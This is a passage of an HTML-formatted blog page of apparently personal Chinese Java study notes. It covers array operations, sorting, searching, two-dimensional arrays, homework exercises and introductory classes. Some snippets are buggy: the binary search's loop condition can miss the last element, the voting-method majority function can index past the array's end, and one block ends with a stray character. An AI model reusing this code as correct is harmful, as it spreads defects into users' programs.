class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> toString(array);</span><br><span class="line">        String ret2= toString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 =  arr;<span class="comment">//这不算拷贝，没有新的内存空间</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr3[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        System.out.println(Arrays.toString(arr2));</span><br><span class="line">        <span class="comment">//扩容2倍</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = Arrays.copyOf(arr, arr.length * <span class="number">2</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] arr4 = Arrays.copyOfRange(arr, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr4));</span><br><span class="line">        <span class="type">int</span>[] arr5 = arr.clone();</span><br><span class="line">        System.out.println(Arrays.toString(arr5));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="求平均值"><a href="#求平均值" class="headerlink" title="求平均值"></a>求平均值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">avg</span><span class="params">(<span class="type">int</span> arr[])</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x : arr) &#123;</span><br><span class="line">            sum += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum * <span class="number">1.0</span> / arr.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span> ,<span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        System.out.println(avg(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="找下标"><a href="#找下标" class="headerlink" title="找下标"></a>找下标</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">find1</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &lt; key) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; key) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">8</span> ,<span class="number">3</span>, <span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    Arrays.sort(arr);<span class="comment">//快排,升序，降序需要比较器，没学;</span></span><br><span class="line">    <span class="comment">//也可以用Arrays.binarySearch()</span></span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">    System.out.println(binarySearch(arr, <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="复习下冒泡"><a href="#复习下冒泡" class="headerlink" title="复习下冒泡"></a>复习下冒泡</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; len - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                    arr[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>优化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubblesort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                arr[j] = arr[j +  <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                flg =<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flg == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    bubblesort(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组逆序"><a href="#数组逆序" class="headerlink" title="数组逆序"></a>数组逆序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    reverse(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fla</span> <span class="operator">=</span> Arrays.equals(arr, arr2);</span><br><span class="line">    System.out.println(fla);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="批量初始化"><a href="#批量初始化" class="headerlink" title="批量初始化"></a>批量初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">    Arrays.fill(arr, <span class="number">2</span>, <span class="number">5</span>, -<span class="number">1</span>);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//不规则数组,没指定列arr[0]是null</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][];</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">            System.out.print(arr[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span>[] arr1: arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.println(Arrays.toString(arr));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));<span class="comment">//一维数组</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.deepToString(arr));<span class="comment">//[[0, 0, 0], [0, 0, 0]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr3 = &#123;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>&#125;,&#123;<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组中是否存在三个连续的奇数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">func5</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (count ==<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    System.out.println(func5(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多数元素leecode169</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    Arrays.sort(arr);</span><br><span class="line">    <span class="keyword">return</span> arr[arr.length/<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//投票法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">majorityElement2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == ret) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            ret = arr[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    System.out.println(majorityElement2(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一个数组，进有一个元素出现一次，其它都出现俩次</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        ret = ret ^ arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    System.out.println(func4(arr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] funca(<span class="type">int</span>[] arr, <span class="type">int</span> target) &#123;</span><br><span class="line">    <span class="type">int</span>[] ret = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] + arr[j] == target) &#123;</span><br><span class="line">                ret[<span class="number">0</span>] = i;</span><br><span class="line">                ret[<span class="number">1</span>] = j;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//奇数位于偶数之前</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    func(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">transform1</span><span class="params">(<span class="type">int</span>[] a)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        a[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] transform(<span class="type">int</span>[] a) &#123;</span><br><span class="line">    <span class="type">int</span>[] tmpArr = <span class="keyword">new</span> <span class="title class_">int</span>[a.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        tmpArr[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmpArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] ret = transform(a);<span class="comment">//a不变</span></span><br><span class="line">    System.out.println(Arrays.toString(ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//行为（方法）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类名 大驼峰</span></span><br><span class="line"><span class="comment">//方法名 小驼峰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WashJi</span> &#123;</span><br><span class="line">    <span class="comment">//属性[字段]---》成员属性</span></span><br><span class="line">    <span class="keyword">public</span> String brand;    <span class="comment">//品牌</span></span><br><span class="line">    <span class="keyword">public</span> String type;     <span class="comment">//型号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> weight;   <span class="comment">//重量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> length;   <span class="comment">//长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> width;   <span class="comment">//宽</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> height;   <span class="comment">//高</span></span><br><span class="line">    <span class="keyword">public</span> String color;   <span class="comment">//颜色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//行为[方法]----》成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">WashJi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;洗衣功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dryClothes</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;脱水功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTime</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String color;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wag</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;摇尾巴&quot;</span>  );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(String ret)</span> &#123;</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实例化一个对象</span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.name=<span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        dog.wag();</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog2.name = <span class="string">&quot;ximu&quot;</span>;</span><br><span class="line">        dog2.wag();</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        <span class="comment">//通过一个类可以实例化无数对象</span></span><br><span class="line">        dog.func(ret);</span><br><span class="line">    &#125;</span><br><span 